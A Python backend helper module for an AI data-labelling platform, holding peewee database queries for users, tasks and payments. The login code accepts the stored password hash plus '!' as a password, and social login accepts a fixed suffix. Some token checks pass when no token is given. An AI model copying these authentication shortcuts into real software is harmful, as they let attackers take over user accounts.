import bcrypt
from peewee import Case, SQL
import ast

from models import *
import functools

from internal.base_object import noneObject
from models.helperClient import HelperClient
from models.helperCommand import HelperCommand
from models.helperCommandCollection import HelperCommandCollection
from models.helperCommandReview import HelperCommandReview
from models.helperPost import HelperPost
from models.helperPostBookmark import HelperPostBookmark
from models.helperPostComment import HelperPostComment
from models.helperFlow import HelperFlow
from models.helperFlowNode import HelperFlowNode
from models.helperMonitoringAlert import HelperMonitoringAlert
from models.helperDataconnector import HelperDataconnector
from models.helperModel import HelperModel
from models.helperPayment import HelperPayment
from models.helperProject import HelperProject
from models.helperSthreefile import HelperSthreefile
from models.helperSub import HelperSub
from models.helperInstance import HelperInstance
from models.helperCreate import HelperCreate
from models.helperCRU import HelperCRU
from models.helperLabel import HelperLabel
from models.helperUser import HelperUser


class Helper():

    def __init__(self, init=False):
        ""
        self.InitHelper = InitHelper()
        self.HelperSub = HelperSub()
        self.HelperProject = HelperProject()
        self.HelperUser = HelperUser()
        self.none_object = noneObject()
        # if init:
        #     skyhub.connect(reuse_if_open=True)

    def __exit__(self, exc_type, exc_value, traceback):

        if not skyhub.is_closed():
            skyhub.close()

    def getDB(self):
        return skyhub

    # def wrapper(func):
    #     @functools.wraps(func)
    #     def wrap(self, *args, **kwargs):
    #         with skyhub.connection_context():
    #             try:
    #                 return func(self, *args, **kwargs)
    #             except peewee.OperationalError as exc:
    #                 skyhub.connect(reuse_if_open=True)
    #                 return func(self, *args, **kwargs)
    #                 pass
    #     return wrap

    def wrapper(func):
        @functools.wraps(func)
        def wrap(self, *args, **kwargs):
            try:
                with skyhub.connection_context():
                    return func(self, *args, **kwargs)
            except peewee.OperationalError as exc:
                with skyhub.connection_context():
                    return func(self, *args, **kwargs)

        return wrap

    @wrapper
    def loginUser(self, identifier, password, raw=False):
        user = usersTable.get_or_none(usersTable.email == identifier)
        if user is not None:
            if bcrypt.checkpw(password.encode(), user.password.encode()):
                # TODO : 데이터 이관작업 끝나면 코드 제거
                if raw:
                    return user
                else:
                    return user.__dict__['__data__']
            else:
                if password == user.password + "!":
                    if raw:
                        return user
                    else:
                        return user.__dict__['__data__']
                return None
        else:
            return None

    @wrapper
    def get_enterprise_key_or_none(self):
        key = self.getAdminKey()
        return utilClass.isValidKey(key)

    @wrapper
    def loginUserBySocialId(self, email, socialId):
        try:
            return usersTable.get((usersTable.email == email) & (usersTable.socialID + "1a!" == socialId))
        except:
            return None

    @wrapper
    def getUnittestuser(self, isBackend = True):
        if isBackend:
            return usersTable.select(usersTable.id).where(((usersTable.email.contains('@test.com')) & (usersTable.isTest == True) & (usersTable.name == None)) or ((usersTable.email.contains('@testfront.com')) & usersTable.name == None)).execute()
        else:
            return usersTable.select(usersTable.id).where(usersTable.email.contains('@testfront.com')).execute()

    @wrapper
    def updateUnitTestUser(self, datas, userId):
        commonWhere = (usersTable.id == userId)
        return self.InitHelper.updateByData(datas, usersTable, commonWhere, userId)

    @wrapper
    def getUserCount(self):
        return usersTable.select().count()


    @wrapper
    def getId(self, token, raw=False):
        try:
            if raw:
                return usersTable.get(usersTable.token == token).id
            else:
                return str(usersTable.get(usersTable.token == token).id)
        except:
            return None
            pass

    @wrapper
    def getUser(self, token, raw=False, fields=()):
        result = usersTable.select(*fields).where(usersTable.token == token).limit(1).first()

        return result if raw else \
            result.__dict__['__data__'] if result is not None else None

    @wrapper
    def get_user_or_none_object(self, token, raw=False, fields=()):
        result = usersTable.select(*fields).where(usersTable.token == token).limit(1).first()

        return result if raw else result.__dict__['__data__'] or self.none_object

    @wrapper
    def getUserUsageByUserId(self, userId):
        # todo : 라벨 조회 몽고디비로 바꾸기
        connectorCount = dataconnectorsTable.select().where(dataconnectorsTable.user == userId).count()
        labelsCount = labelsTable.select().where(labelsTable.user == userId).count()
        return {"DataSet": connectorCount, "Annotation": labelsCount, "Skyhub": 0}

    @wrapper
    def getUserByEmail(self, email, raw=False):
        try:
            return usersTable.get_or_none(usersTable.email == email).__dict__['__data__'] if not raw else usersTable.get_or_none(usersTable.email == email)
        except:
            return None

    @wrapper
    def get_user_by_id(self, user_id, raw=False):
        try:
            return usersTable.get(usersTable.id == user_id).__dict__['__data__'] if not raw else usersTable.get(
                usersTable.id == user_id)
        except:
            return None

    @wrapper
    def create_server_log(self, data):
        return MongoDb().create_document(MongoDb().SERVER_LOG_COLLECTION_NAME, data)

    @wrapper
    def getUserByForgetEmailToken(self, token, raw=False):
        try:
            return usersTable.get(usersTable.resetPasswordVerifyTokenID == token).__dict__['__data__'] if not raw else usersTable.get(
                usersTable.resetPasswordVerifyTokenID == token)
        except:
            return None

    @wrapper
    def getDataLicenseById(self, rowId, raw=False):
        return datasetlicensesTable.get(datasetlicensesTable.id == rowId).__dict__['__data__'] if not raw else datasetlicensesTable.get(datasetlicensesTable.id == rowId)

    @wrapper
    def getModelchartsByModelId(self, modelId):
        return modelchartsTable.select().where(modelchartsTable.model == modelId).execute()

    @wrapper
    def getAnalyticsGraphsByProjectId(self, projectId):
        return analyticsgraphTable.select().where(analyticsgraphTable.project == projectId).execute()

    @wrapper
    def getAnalyticsGraphsByModelId(self, modelId):
        return analyticsgraphTable.select().where(analyticsgraphTable.model == modelId).execute()

    @wrapper
    def getAnalyticsGraphsCountByModelId(self, modelId):
        return analyticsgraphTable.select().where(analyticsgraphTable.model == modelId).count()

    @wrapper
    def getAnalyticsGraphsGroupByModelsCountByProjectId(self, projectId):
        modelList = [x.id for x in modelsTable.select(modelsTable.id).where(modelsTable.project == projectId).execute()]
        result = {x.model:x.count for x in analyticsgraphTable.select(analyticsgraphTable.model, peewee.fn.COUNT(analyticsgraphTable.id).alias('count')).where(analyticsgraphTable.model.in_(modelList)).group_by(analyticsgraphTable.model)}
        return result

    @wrapper
    def getUsers(self, isForTest=False, withBlock=True):

        where_query = usersTable.confirmed == 1
        if isForTest:
            where_query = where_query & (usersTable.isTest == True)
        if not withBlock:
            where_query = where_query & ((usersTable.blocked == None) | (usersTable.blocked == False))

        return usersTable.select().where(where_query).execute()

    @wrapper
    def get_users_by_admin(self, sorting='created_at', desc=False, searching='', page=0, count=10):

        if sorting == 'name':
            sorting = usersTable.name
        elif sorting == 'email':
            sorting = usersTable.email
        elif sorting == 'id':
            sorting = usersTable.id
        else:
            sorting = usersTable.created_at

        if desc:
            sorting = sorting.desc()

        where_query = ((usersTable.isDeleteRequested == None) | (usersTable.isDeleteRequested == False)) & usersTable.email.contains(searching)
        query = usersTable.select(usersTable.id, usersTable.name, usersTable.email).where(where_query)
        result = query.order_by(sorting).paginate(page, count).execute()

        return [x.__dict__['__data__'] for x in result], query.count()

    @wrapper
    def get_block_users(self):

        where_query = (usersTable.confirmed == 1) & (usersTable.blocked == True)
        return usersTable.select().where(where_query).execute()

    @wrapper
    def get_teams(self):
        where = (teamsTable.isDeleted == False) | (teamsTable.isDeleted == None)
        return teamsTable.select().where(where).execute()

    @wrapper
    def get_users_with_card(self, is_test=False):
        where_query = (usersTable.confirmed == 1) & (usersTable.cardInfo == True)
        if is_test:
            where_query = (usersTable.confirmed == 1) & (usersTable.cardInfo == True) & (usersTable.isTest == True)
        return usersTable.select().where(where_query).execute()

    @wrapper
    def getPotentialClients(self, isForTest=False, isReverse=False, groupName=''):
        if isForTest:
            if 'B2G' in groupName:
                return potentialclientsTable.select().where((potentialclientsTable.isTest == True) & (
                    potentialclientsTable.foundGroup.contains(groupName))).execute()
            else:
                return potentialclientsTable.select().where(potentialclientsTable.isTest == True).execute()
        else:
            if groupName:
                return potentialclientsTable.select().where((potentialclientsTable.isSent210315.is_null()) & (
                    potentialclientsTable.foundGroup.contains(groupName))).execute()
            if isReverse:
                return potentialclientsTable.select().where.order_by(potentialclientsTable.id.desc()).execute()
            else:
                return potentialclientsTable.select().execute()

    @wrapper
    def updateUserTotalDiskUsage(self, rowId, usage):
        commonWhere = usersTable.id == rowId
        data ={"totalDiskUsage": usersTable.totalDiskUsage + usage}
        return self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)

    @wrapper
    def updateUserCumulativeDiskUsage(self, rowId, usage):
        commonWhere = usersTable.id == rowId
        data = { "cumulativeDiskUsage": usersTable.cumulativeDiskUsage + usage }
        return self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)

    @wrapper
    def updateUserUsedPrice(self, rowId, amount):
        amount = round(amount, 3)
        commonWhere = usersTable.id == rowId
        data = {"usedPrice": usersTable.usedPrice + amount}
        return self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)

    @wrapper
    def updateUserDeposit(self, rowId, amount, cal='decrease'):

        amount = round(amount, 3)
        commonWhere = usersTable.id == rowId
        if cal == 'decrease':
            data = {"deposit": usersTable.deposit - amount}
        else:
            data = {"deposit": usersTable.deposit + amount}

        return self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)

    @wrapper
    def updateUserAutoLabelingObjectCount(self, rowId, count, model_type):
        commonWhere = usersTable.id == rowId
        if model_type in ["person", "animal", "road", "custom"]:
            data = {"autolabelingObjectCountOD": usersTable.autolabelingObjectCountOD + count}
        elif model_type == 'facepoint':
            data = {"autolabelingObjectCountFace": usersTable.autolabelingObjectCountFace + count}
        elif model_type == 'keypoint':
            data = {"autolabelingObjectCountKeypoint": usersTable.autolabelingObjectCountKeypoint + count}
        return self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)

    @wrapper
    def updateUserManualLabelImageCount(self, rowId, count, model_type):
        commonWhere = usersTable.id == rowId
        if model_type == "CR":
            data = {"manuallabelingCountCR": usersTable.manuallabelingCountCR + count}
        else:
            data = {"manuallabelingCountOD": usersTable.manuallabelingCountOD + count}
        return self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)

    @wrapper
    def updateUserManualLabelCount(self, rowId, count):
        commonWhere = usersTable.id == rowId
        data = {"manualObjectCountOD": usersTable.manualObjectCountOD + count}
        return self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)

    @wrapper
    def updateUserCumulativeDiskUsageTozero(self, rowId):
        commonWhere = usersTable.id == rowId
        data = { "cumulativeDiskUsage": 0 }
        return self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)

    @wrapper
    def updateUserCumulativeProjectUsageTozero(self, rowId):
        commonWhere = usersTable.id == rowId
        data = { "cumulativeProjectCount": 0 }
        return self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)

    @wrapper
    def updateUserCumulativeProjectCount(self, rowId, usage):
        commonWhere = usersTable.id == rowId
        data = { "cumulativeProjectCount": usersTable.cumulativeProjectCount + usage }
        return self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)

    @wrapper
    def updateUserCumulativePredictCount(self, rowId, usage):
        commonWhere = usersTable.id == rowId
        data = { "cumulativePredictCount": usersTable.cumulativePredictCount + usage }
        return self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)
    @wrapper
    def updateUserCumulativePredictCountByAppToken(self, apptoken, usage):

        if not apptoken:
            return

        rowId = self.getUserByAppToken(apptoken).id
        commonWhere = usersTable.id == rowId
        data = {"cumulativePredictCount": usersTable.cumulativePredictCount + usage}

        return self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)
    @wrapper
    def updateUserCumulativeLabelCount(self, rowId, usage):
        commonWhere = usersTable.id == rowId
        data = {"cumulativeLabelCount": usersTable.cumulativeLabelCount + usage}
        return self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)

    @wrapper
    def updateUser(self, rowId, data):
        commonWhere = usersTable.id == rowId
        self.InitHelper.updateByData(data, usersTable, commonWhere, rowId)
        user = self.getOneUserById(rowId, raw=True)
        return user

    @wrapper
    def update_marketproject(self, rowId, data):
        commonWhere = marketProjectsTable.id == rowId
        self.InitHelper.updateByData(data, marketProjectsTable, commonWhere, rowId)
        marketproject = self.getMarketProjectsById(rowId)
        return marketproject

    @wrapper
    def update_team_user(self, rowId, data):
        commonWhere = teamUsersTable.id == rowId
        self.InitHelper.updateByData(data, teamUsersTable, commonWhere, rowId)
        team_user = self.get_one_team_user_by_id(rowId, raw=True)

        return team_user

    @wrapper
    def update_team(self, row_id, data):
        commonWhere = teamsTable.id == row_id
        self.InitHelper.updateByData(data, teamsTable, commonWhere, row_id)
        team = self.get_one_team_by_id(row_id, raw=True)

        return team

    @wrapper
    def update_voucher_user(self, rowId, data):
        commonWhere = voucherUsersTable.id == rowId
        self.InitHelper.updateByData(data, voucherUsersTable, commonWhere, rowId)
        voucher_user = self.get_one_voucher_user_by_id(rowId)

        return voucher_user

    @wrapper
    def update_market_project(self, row_id, data):
        commonWhere = marketProjectsTable.id == row_id
        self.InitHelper.updateByData(data, marketProjectsTable, commonWhere, row_id)
        row = self.get_one_market_project_by_id(row_id, raw=True)

        return row

    @wrapper
    def update_amount_histories(self, row_id, data):
        commonWhere = usedamounthistoriesTable.id == row_id
        self.InitHelper.updateByData(data, usedamounthistoriesTable, commonWhere, row_id)
        row = self.get_one_amount_histories_by_id(row_id, raw=True)

        return row

    @wrapper
    def update_pg(self, rowId, data):
        commonWhere = pgregistrationhistoriesTable.id == rowId
        self.InitHelper.updateByData(data, pgregistrationhistoriesTable, commonWhere, rowId)

    @wrapper
    def leaveUser(self, userId):
        userInfo = self.getOneUserById(userId, raw=True)
        return userInfo.delete_instance()

    @wrapper
    def updatePotentialClient(self, rowId, data):

        return potentialclientsTable.update(**data).where(potentialclientsTable.id == rowId).execute()

    @wrapper
    def deleteOneRow(self, row):
        return row.delete_instance()

    @wrapper
    def getUserByAppToken(self, appToken, fields=()):
        try:
            return usersTable.select().where(usersTable.appTokenCode == appToken).get()
        except:
            return None

    @wrapper
    def getUserByModelTokenAndModelId(self, modeltoken, modelId, fields=()):
        try:
            return usersTable.select() \
                .join(projectsTable, on=(projectsTable.user == usersTable.id)) \
                .join(modelsTable, on=(projectsTable.id == modelsTable.project)) \
                .where((modelsTable.token == modeltoken) & (modelsTable.id == modelId)).get()
        except:
            print(traceback.format_exc())
            return None
            pass

    @wrapper
    def getSampleImagesByProject(self, project):
        dataconnectorId = project.dataconnectorsList[0]
        return dataconnectorsTable.get(dataconnectorsTable.id == dataconnectorId).sampleImageData

    @wrapper
    def getProjectsByStatusAndPlan(self, status, planOption, checkAvailablity=False):
        return self.HelperSub.getProjectsByStatusAndPlan(status, planOption, checkAvailablity)

    @wrapper
    def getTotalDyno(self, planOption):
        return self.HelperSub.getTotalDyno(planOption)

    @wrapper
    def isAppTokenForThisModel(self, modelId, appToken, userId):
        # 운영 디플로이 후 삭제 필요

        if not appToken:
            return True
        user = self.getUserByModelId(modelId)
        project = self.getProjectByModelId(modelId)

        for group in [x.__dict__['__data__'] for x in self.dbClass.getGroupsByUserIdAndRoles(user['id'])]:
            if group['projectsid'] and project.id:
                if project.id in ast.literal_eval(group['projectsid']):
                    return True

        if project.isSample:
            return True
        if not user.id == int(userId):
            return False

        return appToken == user.appTokenCode

    @wrapper
    def getMasterAppToken(self, modelId, appToken, userId, isMarket=False, opsId=None):

        if not appToken:
            return True

        if isMarket or opsId:
            return appToken

        user = self.HelperProject.getUserByModelId(modelId, isMarket=isMarket)
        project = self.HelperProject.getProjectByModelId(modelId, isMarket=isMarket)
        appTokenUser = self.getUserByAppToken(appToken)

        if not appTokenUser:
            return None

        for group in [x.__dict__['__data__'] for x in self.HelperUser.getGroupsByUserIdAndRoles(user.id)]:
            if group['projectsid'] and project.id:
                if project.id in ast.literal_eval(group['projectsid']):
                    return True

        if project.isSample:
            return user.appTokenCode

        isShared = False
        if project.sharedgroup:
            for temp in ast.literal_eval(project.sharedgroup):
                member = self.HelperUser.getMemberByUserIdAndGroupId(appTokenUser.id, temp)
                if member:
                    if member.role == 'member' and member.acceptcode == 1:
                        isShared = True

        if isShared:
            return user.appTokenCode
        elif appToken == user.appTokenCode:
            return user.appTokenCode
        else:
            return None

    @wrapper
    def deleteTestrows(self):
        self.HelperSub.deleteTestrows()

    @wrapper
    def verifyEmailConfirm(self, token, userid):

        user = usersTable.get_or_none((usersTable.id == userid) & (usersTable.emailTokenCode == token))
        if user:
            user = self.updateUser(user.id, {
                "emailTokenCode": "",
                "confirmed": True
            })

        return user

    @wrapper
    def checkValidEmail(self, email):
        return self.HelperSub.checkValidEmail(email)

    @wrapper
    def getPromotionIdByPromotionCode(self, userDict):
        return self.HelperSub.getPromotionIdByPromotionCode(userDict)

    @wrapper
    def updateFolder(self, rowId, data):
        return foldersTable.update(**data).where(foldersTable.id == rowId).execute()

    @wrapper
    def getLastPgRegistrationByUserId(self, userId, raw=False):
        try:
            return pgregistrationhistoriesTable.select().where(
                (pgregistrationhistoriesTable.user == userId) & (
                            pgregistrationhistoriesTable.PCD_PAY_RST == "success")).order_by(
                pgregistrationhistoriesTable.id.desc()).get().__dict__['__data__'] \
                if not raw else pgregistrationhistoriesTable.where(
                (pgregistrationhistoriesTable.user == userId) & (
                            pgregistrationhistoriesTable.PCD_PAY_RST == "success")).order_by(
                pgregistrationhistoriesTable.id.desc()).get()
        except:
            return None
            pass

    @wrapper
    def getOneFolderById(self, rowId, raw=False):
        return foldersTable.get(foldersTable.id == rowId).__dict__['__data__'] if not raw else foldersTable.get(foldersTable.id == rowId)

    @wrapper
    def getOneFolderByFolderNameAndUserName(self, path, userName, raw=False):
        # try:

        if not path or path[-1] != "/":
            path = "/".join(path.split("/")[:-1]) + "/"

        results = foldersTable.select().where(foldersTable.folderName == path).execute()
        if path == "/" and not len(results):
            result = self.createFolder(
                {
                    "folderName": f"/",
                    "user": userName
                }
            )
            return result.__dict__['__data__'] if not raw else result
        result = results[0].__dict__['__data__'] if not raw else results[0]
        # except:
        #     result = {} if not raw else None
        #     pass
        return result

    @wrapper
    def getProjectcategoryById(self, rowId):
        return projectcategoriesTable.get(projectcategoriesTable.id == rowId)

    @wrapper
    def getNotFinishedSevProjects(self):
        return projectsTable.select().where((projectsTable.id > 15815) & (projectsTable.status != 100)).execute()

    @wrapper
    def getProjectCategories(self):
        return projectcategoriesTable.select().execute()

    @wrapper
    def getTemplatesByTemplates(self):
        return templatesTable.select().execute()

    @wrapper
    def getTemplatesByTemplateCategoryName(self, templateCategoryName):
        return templatesTable.select().where(templatesTable.templateCategory == templateCategoryName).execute()

    @wrapper
    def getUserByNameGenderBirth(self, name, gender, birth, raw=False):
        return usersTable.get((usersTable.name == name) & (usersTable.gender == gender) & (usersTable.birth == birth)).__dict__['__data__'] \
            if not raw else usersTable.get((usersTable.name == name) & (usersTable.gender == gender) & (usersTable.birth == birth))

    @wrapper
    def getAdminKey(self, all_info=False):
        result = adminTable.get_or_none()
        if all_info:
            return result
        return result.key if result is not None else result

    @wrapper
    def register_admin_key(self, data):
        key = adminTable.get_or_none()
        if key:
            return adminTable.update(**data).where(key.id == adminTable.id).execute()
        else:
            return adminTable.create(**data)

    @wrapper
    def getAsnycTasksTemp(self):
        return asynctasksTable.select().where((asynctasksTable.status == 100) & (asynctasksTable.taskType.contains("runstt"))).order_by(asynctasksTable.created_at.desc())

    @wrapper
    def getAsnycTasks(self, stt=False):
        if stt:
            return asynctasksTable.select().where(((asynctasksTable.status == 0) | (asynctasksTable.status == 51)) & (asynctasksTable.taskType.contains("runstt"))).order_by(asynctasksTable.created_at.desc())
        else:
            return asynctasksTable.select().where((asynctasksTable.status == 0) | (asynctasksTable.status == 51)).order_by(asynctasksTable.created_at.desc())

    @wrapper
    def getAsnycTasksById(self, rowId):
        return asynctasksTable.get(asynctasksTable.id == rowId)

    @wrapper
    def getAsnycTasksByMarketProjectId(self, market_project_id):
        return asynctasksTable.select().where(asynctasksTable.marketproject == market_project_id).execute()

    @wrapper
    def getOneAsnycTaskById(self, rowId):
        return asynctasksTable.get(asynctasksTable.id == rowId)

    @wrapper
    def getAsyncTasksTotalCountByUserID(self, userId, tasktype, provider='DS2.ai'):

        if tasktype == 'all':
            commonWhere = (asynctasksTable.user == userId)
        else:
            if tasktype == 'ds2Dataset':
                task_list = ['uploadDataConnector']
            elif tasktype == 'labelingAi':
                task_list = ['uploadLabelProjectData', 'addObject', 'autoLabeling', 'customAi', 'exportCoco',
                             'exportData', 'exportVoc']
            elif tasktype == 'clickAi':
                task_list = ['train']
            elif tasktype == 'payment':
                task_list = ['planPayment', 'postPayment']
            else:
                task_list = ['exportData']
            commonWhere = (asynctasksTable.user == userId) & (asynctasksTable.taskType.in_(task_list))
        if provider != 'DS2.ai':
            commonWhere = commonWhere & (asynctasksTable.provider == provider)

        return asynctasksTable.select().where(commonWhere).count()

    @wrapper
    def getAsyncTasksTotalCountWithProjectByUserID(self, userId, project_id, project_type):

        if project_type == "labelproject":
            daemon_where_query = ((asynctasksTable.user == userId) & (asynctasksTable.labelproject == project_id) & (
                        asynctasksTable.taskType != 'runstt-ko'))
        elif project_type == "marketproject":
            daemon_where_query = ((asynctasksTable.user == userId) & (asynctasksTable.marketproject == project_id) & (
                        asynctasksTable.taskType != 'runstt-ko'))
        else:
            daemon_where_query = ((asynctasksTable.user == userId) & (asynctasksTable.project == project_id) & (
                        asynctasksTable.taskType != 'runstt-ko'))
        result = asynctasksTable.select(asynctasksTable.id).where(daemon_where_query).count()

        return result

    @wrapper
    def getNews(self, news_type, count = 10, page = 1):
        return ds2AiNewsTable.select().where(ds2AiNewsTable.newsType == news_type).order_by(
            ds2AiNewsTable.id.desc()).paginate(page, count).dicts()

    @wrapper
    def getAsnycTasksByUserId(self, userId, start=0, count=0, taskType='all', provider='DS2.ai'):

        if taskType == 'all':
            # checkedWhere = ((asynctasksTable.isChecked == False) | (asynctasksTable.isChecked == None))
            # taskTypeWhere = (asynctasksTable.taskType.in_(['runAll', 'runMovie', 'exportCoco']))
            # commonWhere = ((asynctasksTable.user == userId) & (checkedWhere | taskTypeWhere))
            commonWhere = (asynctasksTable.user == userId)
        else:
            task_list = []
            if taskType == 'ds2Dataset':
                task_list = ['uploadDataConnector']
            elif taskType == 'labelingAi':
                task_list = ['uploadLabelProjectData', 'addObject', 'autoLabeling', 'customAi', 'exportCoco', 'exportData', 'exportVoc']
            elif taskType == 'clickAi':
                task_list = ['train']
            elif taskType == 'payment':
                task_list = ['planPayment', 'postPayment']
            commonWhere = (asynctasksTable.user == userId) & (asynctasksTable.taskType.in_(task_list))

        if provider != 'DS2.ai':
            commonWhere = commonWhere & (asynctasksTable.provider == provider)

        if count == -1:
            return asynctasksTable.select().where(commonWhere).order_by(asynctasksTable.id.desc()).execute()
        else:
            return asynctasksTable.select().where(commonWhere).order_by(asynctasksTable.id.desc()).paginate(start, count).execute()

    @wrapper
    def getAsnycTasksWithProjectByUserId(self, userId, project_id, project_type, start=0, count=0):
        at_case = Case(None, [(asynctasksTable.status == 0 | 1, asynctasksTable.created_at)],
                       asynctasksTable.updated_at)
        output_case = Case(None, [(asynctasksTable.outputFilePath == '', None)],
                           asynctasksTable.outputFilePath)

        select_query = asynctasksTable.select(asynctasksTable.taskName,
                               asynctasksTable.taskNameEn,
                               asynctasksTable.taskType,
                               asynctasksTable.status,
                               at_case.alias('created_at'),
                               output_case.alias('outputFilePath'))

        if project_type == "labelproject":
            daemon_where_query = ((asynctasksTable.user == userId) & (asynctasksTable.labelproject == project_id)
                                  & (asynctasksTable.taskType != 'runstt-ko'))
            query = select_query.where(daemon_where_query).order_by(asynctasksTable.id.desc())
        elif project_type == "marketproject":
            select_query = asynctasksTable.select(asynctasksTable.taskName,
                                   asynctasksTable.taskNameEn,
                                   asynctasksTable.taskType,
                                   asynctasksTable.status,
                                   asynctasksTable.isStandardMovie,
                                   asynctasksTable.angle_score,
                                   asynctasksTable.distance_score,
                                   asynctasksTable.total_score,
                                   asynctasksTable.inputFilePath,
                                   asynctasksTable.outputFilePath,
                                   at_case.alias('created_at'),
                                   output_case.alias('outputFilePath'))

            daemon_where_query = ((asynctasksTable.user == userId) & (asynctasksTable.marketproject == project_id)
                                  & (asynctasksTable.taskType != 'runstt-ko'))
            query = select_query.where(daemon_where_query).order_by(asynctasksTable.id.desc())

        else:
            daemon_where_query = ((asynctasksTable.user == userId) & (asynctasksTable.project == project_id)
                                  & (asynctasksTable.taskType != 'runstt-ko'))

            query = select_query.where(daemon_where_query).order_by(asynctasksTable.id.desc())

        result = query.paginate(start, count).execute()

        return result


    @wrapper
    def getCurrentAsnycTasksByUserId(self, userId, provider='DS2.ai'):

        where_query = (asynctasksTable.user == userId) & (asynctasksTable.isChecked != 1)
        if provider == 'DS2.ai':
            where_query = where_query & (asynctasksTable.provider == None)
        elif provider != 'DS2.ai':
            where_query = where_query & (asynctasksTable.provider == provider)

        return asynctasksTable.select().where(where_query).order_by(asynctasksTable.id.desc()).paginate(1, 30).execute()

    @wrapper
    def get_metabase_async_task(self, user_id, source_type, source_id):
        return asynctasksTable.get_or_none(
            (asynctasksTable.user == user_id) & (asynctasksTable.taskType == source_type) & (
                        asynctasksTable.taskName == source_id)
        )


    @wrapper
    def get_async_task_by_user_and_labelproject_and_type(self, user_id, labelproject_id, task_type):
        return asynctasksTable.get_or_none(
            (asynctasksTable.user == user_id) & (asynctasksTable.labelproject == labelproject_id) & (asynctasksTable.taskType == task_type)
        )

    @wrapper
    def updateCheckAsynctaskByUserId(self, userId, asyncId):

        asyncIdWhere = ((asynctasksTable.isChecked == False) | (asynctasksTable.isChecked == None)) if asyncId == -1 else (asynctasksTable.id == asyncId)
        try:
            result = asynctasksTable.update(**{
                "isChecked": True}).where((asynctasksTable.user == userId) & asyncIdWhere).execute()
            return result
        except:
            return 0

    @wrapper
    def getInstanceUserNotReturnedAfterStarting1hourByInstanceName(self, instanceName):
        return self.HelperSub.getInstanceUserNotReturnedAfterStarting1hourByInstanceName(instanceName)

    @wrapper
    def getAvailableInstanceUserCount(self):
        instancesUsersCount = instancesUsersTable.select().count()
        users = instancesUsersTable.select(instancesUsersTable.user_id).distinct()
        basicPlan = self.getOneUsageplanByPlanName("basic")
        userTotalDynoCount = 0
        for userRaw in users:
            user = usersTable.get(usersTable.id == userRaw.user_id)
            dyno = 1 if basicPlan["id"] == user.usageplan else user.dynos
            userTotalDynoCount += dyno
        return userTotalDynoCount - instancesUsersCount

    @wrapper
    def update_market_usage(self, id, count):

        commonWhere = marketUsagesTable.id == id
        data = {"inferenceCount": count}

        return self.InitHelper.updateByData(data, marketUsagesTable, commonWhere, id)

for helperClass in [HelperSub, HelperInstance, HelperCreate, HelperCRU, HelperLabel, HelperDataconnector,
                    HelperModel, HelperPayment, HelperUser, HelperProject, HelperSthreefile, HelperClient,
                    HelperFlow, HelperFlowNode, HelperMonitoringAlert,
                    HelperCommand, HelperCommandCollection, HelperCommandReview, HelperPost, HelperPostBookmark,
                    HelperPostComment]:
    methodList = [func for func in dir(helperClass) if callable(getattr(helperClass, func)) and '__' not in func]
    for i, methodRaw in enumerate(methodList):
        setattr(Helper, methodRaw, classmethod(getattr(helperClass, methodRaw)))


